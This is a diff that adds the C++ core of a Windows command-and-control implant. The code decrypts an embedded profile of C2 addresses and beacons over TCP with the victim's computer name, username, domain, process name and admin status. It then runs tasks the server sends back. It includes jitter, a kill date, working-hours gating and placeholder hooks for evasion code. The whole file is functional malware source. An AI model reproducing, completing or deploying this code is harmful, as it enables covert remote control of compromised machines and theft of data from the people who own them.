@@ -1,0 +1,399 @@
+#include "Agent.h"
+#include "Commander.h"
+#include "ConnectorTCP.h"
+#include "JobsController.h"
+#include "Downloader.h"
+#include "../protocol/protocol.h"
+#include "../crypto/crypto.h"
+// __EVASION_INCLUDE__
+
+#include <stdint.h>
+#include <string.h>
+#include <stdlib.h>
+#include <time.h>
+#include <string>
+#include <vector>
+
+namespace {
+struct DefaultProfile {
+    uint32_t type = PROTO_WATERMARK;
+    std::vector<std::string> addresses;
+    uint32_t connTimeout = 10;
+    uint32_t connCount = 0;
+    uint32_t sleep = 5;
+    uint32_t jitter = 0;
+    uint32_t killDate = 0;
+    int workStart = 0;
+    int workEnd = 0;
+};
+
+static uint32_t encodeWorkingTime(int start, int end)
+{
+    if (start == 0 && end == 0) {
+        return 0;
+    }
+    int startHour = start / 100;
+    int startMin  = start % 100;
+    int endHour   = end / 100;
+    int endMin    = end % 100;
+    return ((uint32_t)startHour << 24) | ((uint32_t)startMin << 16) | ((uint32_t)endHour << 8) | (uint32_t)endMin;
+}
+
+static void decodeWorkingTime(uint32_t wt, int* workStart, int* workEnd)
+{
+    if (!workStart || !workEnd) {
+        return;
+    }
+    if (wt == 0) {
+        *workStart = 0;
+        *workEnd = 0;
+        return;
+    }
+    int startHour = (int)((wt >> 24) & 0xff);
+    int startMin  = (int)((wt >> 16) & 0xff);
+    int endHour   = (int)((wt >> 8) & 0xff);
+    int endMin    = (int)(wt & 0xff);
+    *workStart = startHour * 100 + startMin;
+    *workEnd = endHour * 100 + endMin;
+}
+
+static std::string currentProcessName()
+{
+    char path[MAX_PATH] = {0};
+    DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
+    if (len == 0 || len >= MAX_PATH) {
+        return "__NAME__";
+    }
+    for (int i = (int)len - 1; i >= 0; --i) {
+        if (path[i] == '\\' || path[i] == '/') {
+            return std::string(path + i + 1);
+        }
+    }
+    return std::string(path);
+}
+
+static uint32_t localIPv4()
+{
+    return 0;
+}
+
+static BOOL isElevatedLocal()
+{
+    HANDLE hToken = NULL;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        return FALSE;
+    }
+    TOKEN_ELEVATION elevation = {};
+    DWORD retLen = 0;
+    BOOL elevated = FALSE;
+    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &retLen)) {
+        elevated = elevation.TokenIsElevated ? TRUE : FALSE;
+    }
+    CloseHandle(hToken);
+    return elevated;
+}
+
+static BOOL parseEmbeddedProfile(const BYTE* blob, ULONG blobSize, DefaultProfile* outProfile, BYTE** outKey)
+{
+    if (!blob || blobSize <= 32 || !outProfile || !outKey) {
+        return FALSE;
+    }
+
+    BYTE* key = (BYTE*)LocalAlloc(LPTR, 32);
+    if (!key) {
+        return FALSE;
+    }
+    memcpy(key, blob, 32);
+
+    uint32_t plainLen = 0;
+    BYTE* plain = DecryptData(blob + 32, blobSize - 32, key, 32, &plainLen);
+    if (!plain) {
+        LocalFree(key);
+        return FALSE;
+    }
+
+    DefaultProfile profile;
+    ReaderLE r;
+    ReaderLEInit(&r, plain, plainLen);
+
+    profile.type = ReaderLEReadUint32(&r);
+    uint32_t addrCount = ReaderLEReadUint32(&r);
+    for (uint32_t i = 0; i < addrCount; ++i) {
+        char* addr = ReaderLEReadString(&r);
+        if (addr && addr[0]) {
+            profile.addresses.push_back(std::string(addr));
+        }
+        if (addr) {
+            free(addr);
+        }
+    }
+
+    (void)ReaderLEReadUint32(&r); // banner size
+    profile.connTimeout = ReaderLEReadUint32(&r);
+    profile.connCount = ReaderLEReadUint32(&r);
+    (void)ReaderLEReadUint8(&r); // useSSL
+
+    uint32_t junkLen = 0;
+    (void)ReaderLEReadBytes(&r, &junkLen); // client cert
+    (void)ReaderLEReadBytes(&r, &junkLen); // client key
+    (void)ReaderLEReadBytes(&r, &junkLen); // ca cert
+
+    profile.sleep = ReaderLEReadUint32(&r);
+    profile.jitter = ReaderLEReadUint32(&r);
+    profile.killDate = ReaderLEReadUint32(&r);
+    uint32_t workStart = ReaderLEReadUint32(&r);
+    uint32_t workEnd = ReaderLEReadUint32(&r);
+    profile.workStart = (int)workStart;
+    profile.workEnd = (int)workEnd;
+
+    free(plain);
+
+    if (profile.addresses.empty()) {
+        LocalFree(key);
+        return FALSE;
+    }
+
+    if (profile.sleep == 0) {
+        profile.sleep = 5;
+    }
+
+    *outProfile = profile;
+    *outKey = key;
+    return TRUE;
+}
+}
+
+Agent::Agent()
+{
+    srand((unsigned int)time(nullptr));
+
+    commander  = new Commander(this);
+    connector  = new ConnectorTCP();
+    jobs       = new JobsController();
+    downloader = new Downloader();
+
+    // __EVASION_CTOR__
+}
+
+Agent::~Agent()
+{
+    if (commander)  { delete commander;  commander  = nullptr; }
+    if (connector)  { delete connector;  connector  = nullptr; }
+    if (jobs)       { delete jobs;       jobs       = nullptr; }
+    if (downloader) { delete downloader; downloader = nullptr; }
+    if (sessionKey) { LocalFree(sessionKey); sessionKey = nullptr; }
+}
+
+void Agent::Run(void* profileBlob, ULONG profileSize)
+{
+    if (!connector || !commander || !jobs) {
+        return;
+    }
+
+    DefaultProfile profile;
+    BYTE* key = nullptr;
+    if (!parseEmbeddedProfile((const BYTE*)profileBlob, profileSize, &profile, &key)) {
+        return;
+    }
+
+    if (sessionKey) {
+        LocalFree(sessionKey);
+    }
+    sessionKey = key;
+    sleepMs = (profile.sleep > 0 ? profile.sleep : 5) * 1000;
+    jitter = profile.jitter;
+    killDate = (INT64)profile.killDate;
+    workStart = profile.workStart;
+    workEnd = profile.workEnd;
+
+    ConnectorTCP* tcp = static_cast<ConnectorTCP*>(connector);
+    ULONG connAttempts = 0;
+
+    while (active && !ShouldExit()) {
+        WaitForWorkingHours();
+
+        const std::string& address = profile.addresses[connAttempts % profile.addresses.size()];
+        connAttempts++;
+
+        if (!tcp->SetTarget(address.c_str()) || !tcp->Connect()) {
+            tcp->Disconnect();
+            tcp->Sleep(sleepMs, jitter);
+            if (profile.connCount > 0 && connAttempts >= profile.connCount) {
+                break;
+            }
+            continue;
+        }
+
+        connAttempts = 0;
+
+        ULONG beatSize = 0;
+        BYTE* beat = BuildBeat(&beatSize);
+        if (!beat) {
+            tcp->Disconnect();
+            break;
+        }
+
+        BYTE* initFrame = (BYTE*)malloc(beatSize + 8);
+        if (!initFrame) {
+            LocalFree(beat);
+            tcp->Disconnect();
+            break;
+        }
+        initFrame[0] = (BYTE)(profile.type >> 24);
+        initFrame[1] = (BYTE)(profile.type >> 16);
+        initFrame[2] = (BYTE)(profile.type >> 8);
+        initFrame[3] = (BYTE)(profile.type);
+        uint32_t agentId = (uint32_t)rand();
+        initFrame[4] = (BYTE)(agentId >> 24);
+        initFrame[5] = (BYTE)(agentId >> 16);
+        initFrame[6] = (BYTE)(agentId >> 8);
+        initFrame[7] = (BYTE)(agentId);
+        memcpy(initFrame + 8, beat, beatSize);
+
+        BOOL sent = tcp->SendFrame(initFrame, beatSize + 8, sessionKey, 32);
+        free(initFrame);
+        LocalFree(beat);
+        if (!sent) {
+            tcp->Disconnect();
+            tcp->Sleep(sleepMs, jitter);
+            continue;
+        }
+
+        while (active && !ShouldExit()) {
+            ULONG recvSize = 0;
+            BYTE* recv = tcp->RecvFrame(sessionKey, 32, &recvSize);
+            if (!recv || recvSize == 0) {
+                break;
+            }
+
+            ULONG outCapacity = recvSize * 8 + 4096;
+            BYTE* outBuf = (BYTE*)malloc(outCapacity);
+            ULONG outSize = 0;
+            if (!outBuf) {
+                free(recv);
+                break;
+            }
+            commander->ProcessCommandTasks(recv, recvSize, outBuf, &outSize);
+            free(recv);
+
+            if (!tcp->SendFrame(outBuf, outSize, sessionKey, 32)) {
+                free(outBuf);
+                break;
+            }
+            free(outBuf);
+            jobs->Reap();
+        }
+
+        tcp->Disconnect();
+        tcp->Sleep(sleepMs, jitter);
+    }
+
+    tcp->CloseConnector();
+}
+
+BOOL Agent::IsActive()
+{
+    return active;
+}
+
+BYTE* Agent::BuildBeat(ULONG* size)
+{
+    if (!size) {
+        return nullptr;
+    }
+
+    char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
+    DWORD computerLen = MAX_COMPUTERNAME_LENGTH + 1;
+    GetComputerNameA(computerName, &computerLen);
+
+    char username[256] = {0};
+    DWORD usernameLen = sizeof(username);
+    GetUserNameA(username, &usernameLen);
+
+    char domain[256] = {0};
+    GetEnvironmentVariableA("USERDOMAIN", domain, sizeof(domain));
+
+    WriterBE* w = WriterBEInit(512);
+    WriterBEWriteUint32(w, sleepMs / 1000);
+    WriterBEWriteUint32(w, jitter);
+    WriterBEWriteUint32(w, (uint32_t)killDate);
+    WriterBEWriteUint32(w, encodeWorkingTime(workStart, workEnd));
+    WriterBEWriteUint16(w, (uint16_t)GetACP());
+    WriterBEWriteUint16(w, (uint16_t)GetOEMCP());
+    WriterBEWriteUint8(w, 0);
+    WriterBEWriteUint16(w, (uint16_t)GetCurrentProcessId());
+    WriterBEWriteUint16(w, 0);
+    WriterBEWriteUint32(w, 0);
+    WriterBEWriteUint8(w, 10);
+    WriterBEWriteUint8(w, 0);
+    WriterBEWriteUint32(w, localIPv4());
+
+    BYTE flags = 0;
+    if (sizeof(void*) == 8) {
+        flags |= 0x01 | 0x02;
+    }
+    if (isElevatedLocal()) {
+        flags |= 0x04;
+    }
+    WriterBEWriteUint8(w, flags);
+    WriterBEWriteBytes(w, sessionKey, sessionKey ? 32 : 0);
+    WriterBEWriteBytes(w, (BYTE*)domain, (uint32_t)strlen(domain));
+    WriterBEWriteBytes(w, (BYTE*)computerName, (uint32_t)strlen(computerName));
+    WriterBEWriteBytes(w, (BYTE*)username, (uint32_t)strlen(username));
+
+    std::string proc = currentProcessName();
+    WriterBEWriteBytes(w, (BYTE*)proc.c_str(), (uint32_t)proc.size());
+
+    BYTE* beat = (BYTE*)LocalAlloc(LPTR, w->size);
+    if (!beat) {
+        WriterBEFree(w);
+        *size = 0;
+        return nullptr;
+    }
+    memcpy(beat, w->data, w->size);
+    *size = w->size;
+    WriterBEFree(w);
+    return beat;
+}
+
+void Agent::SleepWithJitter()
+{
+    ULONG ms = sleepMs;
+    if (jitter > 0 && jitter <= 90) {
+        int pct  = (int)(rand() % (jitter * 2 + 1)) - (int)jitter;
+        int adj  = (int)ms * pct / 100;
+        int total = (int)ms + adj;
+        if (total < 0) total = 0;
+        ms = (ULONG)total;
+    }
+    Sleep(ms);
+}
+
+BOOL Agent::ShouldExit()
+{
+    if (killDate <= 0) return FALSE;
+    INT64 now = (INT64)time(nullptr);
+    return now >= killDate;
+}
+
+void Agent::WaitForWorkingHours()
+{
+    if (workStart == 0 && workEnd == 0) return;
+
+    while (TRUE) {
+        time_t rawtime;
+        time(&rawtime);
+        struct tm* lt = localtime(&rawtime);
+        int hhmm = lt->tm_hour * 100 + lt->tm_min;
+
+        BOOL inWindow;
+        if (workStart <= workEnd) {
+            inWindow = (hhmm >= workStart && hhmm < workEnd);
+        } else {
+            inWindow = (hhmm >= workStart || hhmm < workEnd);
+        }
+        if (inWindow) break;
+
+        Sleep(60000);
+    }
+}
